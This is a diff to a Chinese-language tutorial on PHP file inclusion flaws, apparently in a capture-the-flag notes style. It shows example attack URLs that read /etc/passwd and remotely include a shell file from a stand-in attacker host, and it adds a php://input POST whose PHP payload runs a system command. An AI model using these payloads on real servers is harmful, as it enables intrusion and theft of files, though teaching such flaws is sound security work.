@@ -37,7 +37,7 @@ readfile()
 ```url
 http://www.xxser.com/index.php?page=/etc/passwd
 ```
-2. 远程包含shell
+2. 远程包含shell  
 allow_url_fopen=on 情况下
 ```url
 http://www.example.com/index.php?page=http://www.attacker.com/echo.txt
@@ -58,6 +58,9 @@ http://www.example.com/index.php?page=./uploadfile/xxx.jpg
   php://input是个可以访问请求的原始数据的只读流,可以接收post请求，将请求作为PHP代码的输入传递给目标变量
   ```url
   http://www.example.com/index.php?page=php://input
+  实例：
+  POST /?file=php://input
+  <?php system("cat /flag");?>
   ```
 5. 包含日志文件
 ```url
